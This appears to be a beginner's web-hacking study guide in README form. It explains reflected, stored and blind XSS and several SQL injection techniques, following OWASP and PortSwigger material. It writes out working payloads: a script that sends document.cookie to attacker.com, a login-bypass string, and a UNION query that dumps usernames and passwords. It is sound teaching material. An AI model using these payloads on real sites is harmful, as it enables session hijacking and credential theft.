# Web-Application-Hacking
Web Hacking Basics

### XSS (Cross Site Scripting)
**What is XSS, or Cross Site Scripting?**<br>
> An injection attack that injects malicious scripts into trusted websites, executing them when against end users of the website to gain access to their sensitive details like: session tokens, cookies, and other details - [https://owasp.org/www-community/attacks/xss/](https://owasp.org/www-community/attacks/xss/)

**How to perform XSS?**<br>
> **Reflected XSS Attacks**<br>
> Reflected XSS occurs when a server ***reflects*** user input from a **HTTP request** without validation, allowing malicious scripts to execute in the user's browser.<br>
> <br>
> **Expected Behavior:**
> ```html
> https://example.com?DATA=test
> 
> <p>You entered: test</p>
> ```
> **Unexpected Malicious Behavior:**
> ```html
> https://example.com?DATA=<script>alert("XSS!");</script>
> 
> <p>You entered: <script>alert("XSS!");</script></p>
> ```
> [https://portswigger.net/web-security/cross-site-scripting/reflected](https://portswigger.net/web-security/cross-site-scripting/reflected)

> <hr>

> **Stored XSS Attacks**<br>
> Stored XSS occurs when an application ***stores*** untrusted input and later includes it in **HTTP responses** without proper validation, allowing persistent malicious scripts to execute.<br>
> <br>
> **Expected Behavior:**
> ```html
> POST /post/comment HTTP/1.1
> Host: vulnerable-website.com
> Content-Length: 100
> 
> postId=3&comment=This+post+was+extremely+helpful.&name=Test+Account&email=test%40example.com
>
> -------------------------------------------------------
> 
> <p>This post was extremely helpful.</p>
> ```
> **Unexpected Malicious Behavior:**
> ```html
> comment=%3Cscript%3E%2F*%2BBad%2Bstuff%2Bhere...%2B*%2F%3C%2Fscript%3E      // <script>/* Bad stuff here... */</script>
>
> -------------------------------------------------------
> 
> <p><script>/* Bad stuff here... */</script></p>
> ```
> [https://portswigger.net/web-security/cross-site-scripting/stored](https://portswigger.net/web-security/cross-site-scripting/stored)

> <hr>

> **Blind Cross-site Scripting**<br>
> Blind XSS occurs when a malicious payload is ***stored on the server*** and executed later in a **different context, such as an admin viewing the data**, often through backend systems.<br>
> <br>
> **Expected Behavior:**
> ```html
> I like this website.
> ```
> 
> ```html
> <!-- Feedback form (vulnerable application) -->
> <form action="/submit-feedback" method="POST">
>     <label for="feedback">Your Feedback:</label>
>     <textarea id="feedback" name="feedback"></textarea>  // Feedback input
>     <button type="submit">Submit</button>
> </form>
> ```
> 
> ```html
> POST /submit-feedback HTTP/1.1
> Host: vulnerable-site.com
> Content-Type: application/x-www-form-urlencoded
> 
> feedback=I+like+this+website.
> ```
> 
> ```html
> <div>
>     <h3>User Feedback:</h3>
>     <p>I like this website.</p>
> </div>
> ```
> 
> **Unexpected Malicious Behavior:**
> ```js
> <script>
>  fetch('https://attacker.com/steal?cookie=' + document.cookie);
> </script>
> ```
> 
> ```html
> <!-- Feedback form (vulnerable application) -->
> <form action="/submit-feedback" method="POST">
>     <label for="feedback">Your Feedback:</label>
>     <textarea id="feedback" name="feedback"></textarea>  // Malicious Script
>     <button type="submit">Submit</button>
> </form>
> ```
> 
> ```html
> POST /submit-feedback HTTP/1.1
> Host: vulnerable-site.com
> Content-Type: application/x-www-form-urlencoded
> 
> feedback=<script>fetch('https://attacker.com/steal?cookie=' + document.cookie);</script>
> ```
> 
> ```html
> <div>
>     <h3>User Feedback:</h3>
>     <p><script>fetch('https://attacker.com/steal?cookie=' + document.cookie);</script></p>
> </div>
> ```

> <hr>

> **DOM-based XSS**<br>
> coming soon...
>

### SQLi (SQL Injection)
**What is SQLi or SQL Injection?**<br>
> An injection attack that inserts malicious SQL commands into vulnerable inputs, allowing attackers to execute unauthorized SQL queries. This can grant access to server databases and expose sensitive user information stored within them. - [https://owasp.org/www-community/attacks/SQL_Injection](https://owasp.org/www-community/attacks/SQL_Injection)

**How to perform SQLi?**<br>
> **Retrieving Hidden Data**<br>
> Retrieving hidden data occurs when attackers exploit vulnerable inputs to manipulate database queries to show hidden data.<br>
> <br>
> **Expected Behavior:**
> ```sql
> https://insecure-website.com/products?category=Gifts
> SELECT * FROM products WHERE category = 'Gifts' AND released = 1
> ```
> 
> **Unexpected Malicious Behavior:**
> ```sql
> https://insecure-website.com/products?category=Gifts'+OR+1=1--
> SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
> -- Return all products in 'Gifts' category including not released products.
> ```
> [https://portswigger.net/web-security/sql-injection#retrieving-hidden-data](https://portswigger.net/web-security/sql-injection#retrieving-hidden-data)

> <hr>

> **Subverting Application Logic**<br>
> Subverting application logic occurs when attackers exploit SQL injection to bypass login checks.<br>
> <br>
> **Expected Behavior:**
> ```sql
> SELECT * FROM users WHERE username = 'test' AND password = '1234'
> -- Login into user 'test`
> -- AND the password is '1234'
> ```
>
> **Unexpected Malicious Behavior:**
> ```sql
> SELECT * FROM users WHERE username = 'admin'--' AND password = ''
> -- Login into user 'admin` -> Login into user 'admin' (No password required.)
> -- AND the (?) comment for this line is: ' AND password = ''
> ```
> [https://portswigger.net/web-security/sql-injection#subverting-application-logic](https://portswigger.net/web-security/sql-injection#subverting-application-logic)

> <hr>

> **SQL Injection UNION Attacks**<br>
> A SQL injection UNION attack allows attackers to retrieve data from other database tables by appending additional queries using the UNION keyword. For the attack to work, the queries must have the same number of columns and compatible data types. To execute this, attackers first determine the number of columns returned by the original query and identify which columns can hold the injected data.<br>
> <br>
> **Expected Behavior:**
> ```sql
> Enter: Gifts
> 
> SELECT name, description FROM products WHERE category = 'Gifts'
> -- List all names and descriptions with 'Gifts' category from 'products' table.
> ```
>
> **Unexpected Malicious Behavior:**
> ```sql
> Enter: ' UNION SELECT username, password FROM users -- 
> 
> SELECT name, description FROM products WHERE category = '' UNION SELECT username, password FROM users -- '
> -- List all names and descriptions with '' category from 'products' table. -> None
> -- (?) AND List all usernames and passwords from 'users' table. -> List all usernames and passwords
> -- (?) AND the comment for this line is: '
> ```
> [https://portswigger.net/web-security/sql-injection#retrieving-data-from-other-database-tables](https://portswigger.net/web-security/sql-injection#retrieving-data-from-other-database-tables)
> <br>
> [https://portswigger.net/web-security/sql-injection/union-attacks](https://portswigger.net/web-security/sql-injection/union-attacks)

> <hr>

> **Examining The Database**<br>
> Test if the database is vulnerable to SQLi.<br>
> <br>
> **Examples:**
> ```sql
> SELECT * FROM v$version
> SELECT * FROM information_schema.tables
> ```
> | Database Type              | Query                                |
> |:---------------------------|:-------------------------------------|
> | Microsoft, MySQL           | ```SELECT @@version```               |
> | Oracle                     | ```SELECT * FROM v$version```        |
> | PostgreSQL                 | ```SELECT version()```               |
>
> **More Examples:**
> ```sql
> ' UNION SELECT @@version--
> ```
>
> ```
> Microsoft SQL Server 2016 (SP2) (KB4052908) - 13.0.5026.0 (X64)
> Mar 18 2018 09:11:49
> Copyright (c) Microsoft Corporation
> Standard Edition (64-bit) on Windows Server 2016 Standard 10.0 <X64> (Build 14393: ) (Hypervisor)
> ```
> [https://portswigger.net/web-security/sql-injection#examining-the-database](https://portswigger.net/web-security/sql-injection#examining-the-database)
> <br>
> [https://portswigger.net/web-security/sql-injection/examining-the-database](https://portswigger.net/web-security/sql-injection/examining-the-database)

> <hr>

> **Blind SQL Injection**<br>
> Blind SQL injection occurs when an application does not display query results or database errors in its responses. Attackers exploit these vulnerabilities using techniques such as modifying query logic to create detectable response differences, triggering time delays to infer conditions, or using out-of-band channels (e.g., DNS lookups) to exfiltrate data.<br>
> <br>
> coming soon...<br>
> [https://portswigger.net/web-security/sql-injection#sql-injection-examples](https://portswigger.net/web-security/sql-injection#sql-injection-examples)
> <br>
> [https://portswigger.net/web-security/sql-injection/blind](https://portswigger.net/web-security/sql-injection/blind)

> <hr>

> **Second-order SQL Injection**<br>
> Second-order SQL injection, also known as stored SQL injection, occurs when user input is stored (e.g., in a database) without being executed, but is later retrieved and incorporated into a SQL query insecurely, allowing exploitation at a later time.<br>
> <br>
> coming soon...<br>
> [https://portswigger.net/web-security/sql-injection#second-order-sql-injection](https://portswigger.net/web-security/sql-injection#second-order-sql-injection)

> <hr>

### CSRF (Cross-Site Request Forgery)
**What is CSRF, or Cross-Site Request Forgery?**<br>
> An attack that forces authenticated users to submit a request to a web application to perform actions that they did not intend to perform.
